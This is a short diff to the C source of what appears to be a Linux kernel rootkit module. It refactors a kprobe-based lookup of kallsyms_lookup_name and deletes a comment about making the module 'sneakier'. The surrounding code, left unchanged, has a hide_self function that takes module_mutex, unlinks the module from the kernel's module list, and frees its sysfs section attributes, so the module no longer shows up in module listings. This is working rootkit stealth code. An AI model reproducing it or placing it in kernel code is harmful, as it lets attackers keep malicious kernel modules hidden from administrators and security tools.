@@ -16,16 +16,16 @@ typedef unsigned long (*pt_kallsyms_lookup_name)(const char *);
 
 unsigned long find_ksymbol(const char *name) {
 #ifdef CONFIG_KPROBES
-	pt_kallsyms_lookup_name lookup;
-	struct kprobe probe = {
-		.symbol_name = "kallsyms_lookup_name",
-	};
+	struct kprobe probe;
+	memset(&probe, 0, sizeof(probe));
+	probe.symbol_name = "kallsyms_lookup_name";
 
 	if (register_kprobe(&probe) != MOD_SUCCESS) {
 		printk(KERN_ERR "Registering kallsyms probe failed.");
 		return MOD_FAIL;
 	}
 
+	pt_kallsyms_lookup_name lookup;
 	lookup = (pt_kallsyms_lookup_name) probe.addr;
 	unregister_kprobe(&probe);
 
@@ -54,7 +54,7 @@ static int reveal_self(void) {
 }
 
 static int hide_self(void) {
-	mod_mutex = (struct mutex *)find_ksymbol("module_mutex");
+	mod_mutex = (struct mutex *) find_ksymbol("module_mutex");
 
 	if (!mod_mutex) {
 		printk(KERN_NOTICE "Couldn't find mutex.");
@@ -70,15 +70,6 @@ static int hide_self(void) {
 	other_modules = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list); 
 
-	/*
-	 * Free sysfs metadata
-	 *
-	 * Freeing the notes_attrs causes a crash.
-	 * notes_attrs is populated at load time
-	 * by the kernel, maybe we can mutate it
-	 * to be sneakier - data here used in sysfs
-	 * entries
-	 */
 	kfree(THIS_MODULE->sect_attrs);
 	THIS_MODULE->sect_attrs = NULL;
 	mutex_unlock(mod_mutex);
